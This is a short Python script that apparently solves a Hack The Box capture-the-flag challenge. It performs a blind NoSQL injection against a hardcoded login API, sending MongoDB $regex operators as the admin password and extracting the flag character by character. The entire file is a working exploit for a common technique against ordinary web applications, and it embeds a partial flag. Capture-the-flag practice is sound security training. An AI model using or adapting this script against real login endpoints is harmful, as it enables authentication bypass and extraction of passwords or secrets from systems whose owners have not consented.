#!/usr/bin/python3

import requests
import json
import string

st = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}'

pas = 'HTB{t0b3_5qL_0r_n05qL_7h4t_is_th3_Qu3st10n'
for i in range(64):
  for i in range(0, len(st)-1):
    data = {'username': 'admin', "password":{"$regex": "%(pass)s%(i)s.*" % {"pass":pas, "i":st[i]}}}
    r = requests.post('http://83.136.249.46:41550/api/login', json=data)
    c = r.content.decode()
    j = json.loads(c)
    
    if j['logged'] == 1:
      pas += st[i]
      print(pas)
      break
